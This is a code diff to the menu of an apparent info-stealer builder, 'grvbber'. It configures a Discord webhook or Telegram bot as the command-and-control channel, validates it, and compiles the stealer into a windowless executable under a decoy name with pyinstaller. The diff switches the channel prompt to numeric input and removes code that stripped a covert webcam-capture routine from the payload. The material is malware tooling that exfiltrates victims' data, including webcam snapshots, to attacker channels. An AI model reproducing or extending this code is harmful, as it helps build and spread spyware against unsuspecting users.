@@ -113,10 +113,10 @@ def menu():
             i = Logging.inp('Builder', 'Option')
             name = opts[i]
             if name == 'ChangeC2':
-                print('type "discord" or "telegram"')
+                print('type 0 for discord or 1 for telegram')
                 c2type = Logging.inp('Builder', 'Type')
                 while True:
-                    if c2type.lower() == 'discord':
+                    if c2type == '0':
                         webhook = Logging.inp('Builder', 'Webhook')
                         if webhook.startswith('https://') and ('discord' in webhook or 'fluxer' in webhook) and '/webhooks/' in webhook:
                             valid = testwebhook(webhook)
@@ -127,7 +127,7 @@ def menu():
                                 Logging.inp2('Press Enter')
                                 cls()
                                 menu()
-                    elif c2type.lower() == 'telegram':
+                    elif c2type == '1':
                         config['tg_token'] = Logging.inp('Builder', 'Bot Token')
                         config['tg_chat'] = Logging.inp('Builder', 'Chat ID')
                         config['type'] = 'telegram'
@@ -184,26 +184,6 @@ def menu():
                 os.system('pip install -r requirements.txt')
                 with open('grvbber.py', 'r', encoding='utf-8') as f:
                     content = f.read()
-                if not config['webcam']:
-                    content = content.replace("""    global webcam_success
-    if config.webcam:
-        import cv2
-        cam_ = os.path.join(output, 'System', 'Webcam.png')
-        os.makedirs(os.path.dirname(cam_), exist_ok=True)
-        try:
-            cap = cv2.VideoCapture(0)
-            ret, frame = cap.read()
-            if ret:
-                cv2.imwrite(cam_, frame)
-                webcam_success = 1
-            else:
-                webcam_success = 0
-            cap.release()
-        except:
-            webcam_success = 0""", '    ...')
-                    with open('built.py', 'w', encoding='utf-8') as f:
-                        f.write(content)
-                    os.system('pyinstaller --onefile --noconsole --exclude-module cv2 --name CharlieKirk --i NONE built.py')
                 with open('built.py', 'w', encoding='utf-8') as f:
                     f.write(content)
                 os.system('pyinstaller --onefile --noconsole --name CharlieKirk --i NONE built.py')
